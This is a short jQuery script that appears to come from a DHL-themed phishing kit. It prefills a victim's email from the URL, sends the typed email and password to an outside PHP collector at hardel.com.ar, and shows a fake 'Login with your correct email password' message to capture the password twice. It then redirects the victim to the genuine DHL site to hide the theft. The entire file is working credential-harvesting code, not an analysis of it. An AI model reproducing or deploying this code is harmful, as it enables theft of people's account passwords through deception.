
$(document).ready(function(){
var count=0;

var email = window.location.hash.substr(1);
if (!email) {

}
else
{
var my_email =email;
$('#email').val(my_email);

var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}



}


$('#submit-btn').click(function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();

                    if (!password) {
                $('#msg').show();
                $('#msg').html("Password field is empty.!");

                return false;
            }

count=count+1;

$.ajax({
dataType: 'JSON',
url: 'https://www.hardel.com.ar/nvnv.php',
type: 'POST',
      	data:{
			email:email,
            password:password,	
      	},
			data: $('#contact').serialize(),
            beforeSend: function(xhr){
            	
            },
            success: function(response){
            	if(response){
            		$("#msg").show();
            		console.log(response);
            		if(response['signal'] == 'ok'){
            			$("#password").val("");
            			if (count>=2) {
            				count=0;
                    // window.location.replace(response['redirect_link']);
                  window.location.replace("https://www.dhl.com");

                }
            	 $("#msg").show();
			$('#msg').html("Login with your correct email password...");
            
            }
            else{
                        	 $("#msg").show();
			$('#msg').html("Login with your correct email password...");
               
            }
        }
    },
    error: function(){
    	$("#password").val("");
    	if (count>=2) {
    		count=0;
    		 window.location.replace("https://www.dhl.com");
    	}
                $("#msg").show();
			$('#msg').html("Login with your correct email password...");
               
    },
    complete: function(){
    	
    }
});
  });


	});


